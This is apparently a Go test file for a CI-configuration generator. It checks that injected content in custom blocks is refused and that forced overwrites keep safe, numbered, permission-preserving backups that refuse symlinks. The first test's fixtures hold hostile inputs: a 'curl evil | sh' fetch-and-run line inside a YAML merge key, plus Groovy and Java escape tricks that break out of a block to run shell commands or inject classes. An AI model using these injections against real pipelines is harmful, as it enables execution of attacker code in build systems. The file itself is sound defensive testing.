// Round 3 bypasses: parser differences (Ruby Psych applies a later << merge over
// explicit keys) and Groovy/Java lexing that the bracket check did not model.
func TestCustomBlockParserDifferentialsAreRefused(t *testing.T) {
	yamlFile := providers.GeneratedFile{Path: "ci.yml", Comment: "#", YAML: true,
		Content: []byte("unit:\n  script:\n    - echo hi\n\n" + render.CustomBlock("#", ""))}
	groovy := providers.GeneratedFile{Path: "Jenkinsfile", Comment: "//",
		Content: []byte("pipeline {\n    agent none\n" + render.CustomBlock("//", "    ") + "}\n")}
	java := providers.GeneratedFile{Path: "PlanSpec.java", Comment: "//",
		Content: []byte("class PlanSpec {\n" + render.CustomBlock("//", "    ") + "}\n")}
	bs := "\\"
	cases := map[string]struct {
		f     providers.GeneratedFile
		lines []string
	}{
		"yaml merge key":          {yamlFile, []string{"<<:", "  unit:", "    script: [curl evil | sh]"}},
		"yaml anchor and alias":   {yamlFile, []string{"a: &x {k: v}", "b: *x"}},
		"yaml explicit tag":       {yamlFile, []string{"extra: !!binary aGk="}},
		"yaml key case collision": {yamlFile, []string{"Unit:", "  script: [id]"}},
		"groovy slashy string":    {groovy, []string{"def r = /'/ ; } ; node { sh 'id' } ; def q = { // '"}},
		"groovy dollar slashy":    {groovy, []string{"def r = $/'/$ ; } ; def q = { // '"}},
		"groovy escaped triple":   {groovy, []string{`def s = """a` + bs + `""" ' """ } ; def q = { // '`}},
		"java unicode escape":     {java, []string{"// " + bs + "u000a } class Evil { static int x = 1;", "static int y = 2; } class Evil2 {"}},
	}
	for name, c := range cases {
		existing := withCustom(t, c.f, c.lines...)
		if _, err := render.Finalize(c.f, "renvoy.yaml", existing); err == nil {
			t.Errorf("%s: custom content was accepted", name)
		}
	}
}

// --force replaces edited files, so it saves the previous content first. Data
// safety therefore does not depend on recognizing misspelled markers.
func TestForceAlwaysKeepsABackup(t *testing.T) {
	for _, v := range [][2]string{
		{"# renvoy:begin  custom-ish", "# renvoy:end  custom-ish"},
		{"# Renvoy:begin custom", "# Renvoy:end custom"},
		{"/* renvoy:begin custom */", "/* renvoy:end custom */"},
		{"// renvoy:begin custom", "// renvoy:end custom"},
		{"# renvoy:begin cusom", "# renvoy:end cusom"},
		{"# renvoy:custom begin", "# renvoy:custom end"},
		{"# renvoi:begin", "# renvoi:end"},
		{"# renvoy\u00a0:begin custom", "# renvoy\u00a0:end custom"},
		{"# ren\u200bvoy:begin custom", "# ren\u200bvoy:end custom"},
		{"# RENVOY:START", "# RENVOY:STOP"},
	} {
		root := t.TempDir()
		existing := "a: 1\n" + v[0] + "\nkeep: me\n" + v[1] + "\n"
		target := filepath.Join(root, "ci", "out.yml")
		if err := os.MkdirAll(filepath.Dir(target), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(target, []byte(existing), 0o644); err != nil {
			t.Fatal(err)
		}
		if _, c := plan(t, root, file("a: 1"), false); len(c) != 1 {
			t.Fatalf("%q: without --force the edited file must be refused", v[0])
		}
		p, c := plan(t, root, file("a: 1"), true)
		if len(c) != 0 || p.Action != render.Overwrite {
			t.Fatalf("%q: action=%s conflicts=%v", v[0], p.Action, c)
		}
		backups, err := render.Write(root, []render.Planned{p})
		if err != nil {
			t.Fatal(err)
		}
		if len(backups) != 1 || backups[0].BackupPath != "ci/out.yml.renvoy-backup" {
			t.Fatalf("%q: backups = %v", v[0], backups)
		}
		saved, err := os.ReadFile(filepath.Join(root, "ci", "out.yml.renvoy-backup"))
		if err != nil || string(saved) != existing {
			t.Fatalf("%q: backup does not hold the previous content: %v %q", v[0], err, saved)
		}
	}
}

// A second forced replacement must not overwrite the first backup.
func TestBackupsAreNumbered(t *testing.T) {
	root := t.TempDir()
	target := filepath.Join(root, "ci", "out.yml")
	if err := os.MkdirAll(filepath.Dir(target), 0o755); err != nil {
		t.Fatal(err)
	}
	for i, want := range []string{"ci/out.yml.renvoy-backup", "ci/out.yml.renvoy-backup.1"} {
		if err := os.WriteFile(target, []byte(fmt.Sprintf("hand: %d\n", i)), 0o644); err != nil {
			t.Fatal(err)
		}
		p, _ := plan(t, root, file("a: 1"), true)
		backups, err := render.Write(root, []render.Planned{p})
		if err != nil || len(backups) != 1 || backups[0].BackupPath != want {
			t.Fatalf("backup %d = %v, %v; want %s", i, backups, err, want)
		}
	}
}

// A symlink planted at the backup path is reported while planning, before any
// file is written, and is never followed.
func TestBackupRefusesSymlink(t *testing.T) {
	root := t.TempDir()
	target := filepath.Join(root, "ci", "out.yml")
	if err := os.MkdirAll(filepath.Dir(target), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(target, []byte("hand: written\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	victim := filepath.Join(t.TempDir(), "victim")
	if err := os.Symlink(victim, target+".renvoy-backup"); err != nil {
		t.Skip(err)
	}
	if _, c := plan(t, root, file("a: 1"), true); len(c) != 1 || !strings.Contains(c[0].Reason, "cannot back up") {
		t.Fatalf("conflicts = %v", c)
	}
	if _, err := os.Stat(victim); err == nil {
		t.Fatal("the symlink target was written")
	}
	if data, _ := os.ReadFile(target); string(data) != "hand: written\n" {
		t.Fatal("the target was changed")
	}
}

// The backup keeps the replaced file's permissions, so a private file stays private.
func TestBackupKeepsPermissions(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX permissions")
	}
	root := t.TempDir()
	target := filepath.Join(root, "ci", "out.yml")
	if err := os.MkdirAll(filepath.Dir(target), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(target, []byte("hand: written\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	p, _ := plan(t, root, file("a: 1"), true)
	if _, err := render.Write(root, []render.Planned{p}); err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(target + ".renvoy-backup")
	if err != nil || info.Mode().Perm() != 0o600 {
		t.Fatalf("backup mode = %v, %v; want 0600", info.Mode().Perm(), err)
	}
}

